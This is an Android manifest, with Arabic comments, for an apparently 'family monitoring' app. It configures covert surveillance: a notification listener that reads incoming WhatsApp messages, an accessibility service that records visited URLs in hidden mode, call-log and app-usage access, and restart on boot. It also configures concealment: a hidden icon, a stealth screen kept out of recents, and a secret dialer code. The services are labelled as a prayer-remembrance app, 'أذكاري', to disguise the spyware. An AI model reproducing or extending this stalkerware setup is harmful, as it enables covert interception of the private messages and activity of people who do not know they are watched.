<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
    <!-- التشغيل التلقائي بعد إعادة تشغيل الهاتف — كان مفقودًا وهذا سبب انقطاع المراقبة -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <!-- استثناء التطبيق من تحسينات البطارية حتى لا يوقفه النظام (يُطلب من المستخدم بحوار النظام) -->
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <!-- صلاحية إحصاء استخدام التطبيقات (تُمنح من إعدادات النظام) -->
    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
        tools:ignore="ProtectedPermissions" />
    <!-- رصد فتح التطبيقات -->
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
        tools:ignore="QueryAllPackagesPermission" />

    <application
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/Theme.Material3.DayNight">

        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- شاشة إعداد الجهاز الفرعي (كود الاقتران والمراقبة) -->
        <activity
            android:name=".SetupActivity"
            android:exported="false" />

        <!-- شاشة الجهاز الأساسي: لوحة المتابعة داخل التطبيق -->
        <activity
            android:name=".WebPanelActivity"
            android:exported="false"
            android:configChanges="orientation|screenSize|keyboardHidden|screenLayout" />

        <!-- شاشة التخفي (تظهر بعد إخفاء الأيقونة، وتُفتح من الإشعار الثابت أو زر الترس) -->
        <activity
            android:name=".StealthActivity"
            android:exported="false"
            android:excludeFromRecents="true" />

        <!-- شاشة «أذكاري»: أذكار الصباح والمساء — يفتحها الإشعار الثابت -->
        <activity
            android:name=".AdhkarActivity"
            android:exported="false" />

        <!-- مستقبِل إعادة تشغيل الجهاز: يشغّل خدمة المراقبة تلقائيًا
             بعد تشغيل الهاتف أو تحديث التطبيق أو طلب إعادة تشغيل داخلي -->
        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                <action android:name="com.family.monitor.RESTART_SERVICE" />
            </intent-filter>
        </receiver>

        <!-- مستقبِل احتياطي صامت (بعض الهواتف تدعمه) — الطريقة الرسمية للرجوع هي الإشعار الثابت -->
        <receiver
            android:name=".DialReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.provider.Telephony.SECRET_CODE" />
                <data
                    android:host="7594"
                    android:scheme="android_secret_code" />
            </intent-filter>
        </receiver>

        <!-- خدمة قراءة الإشعارات: رسائل واتساب الواردة (الرسمي + المجموعات + النسخ المعدلة) -->
        <service
            android:name=".WhatsappNotificationService"
            android:exported="false"
            android:label="أذكاري"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <!-- خدمة المراقبة الأمامية:
             - dataSync لأندرويد 9 وما قبله
             - specialUse من أندرويد 14+ لأن dataSync ممنوع البدء من بث إعادة التشغيل
               (وممنوع أيضًا أكثر من 6 ساعات متواصلة من أندرويد 15) -->
        <service
            android:name=".MonitorService"
            android:exported="false"
            android:foregroundServiceType="dataSync|specialUse">
            <property
                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
                android:value="continuous_family_supervision_monitoring" />
        </service>

        <!-- خدمة إمكانية الوصول: لرصد عناوين المواقع (تعمل أيضًا في الوضع الخفي) -->
        <service
            android:name=".UrlAccessibilityService"
            android:exported="false"
            android:label="أذكاري"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>
    </application>
</manifest>
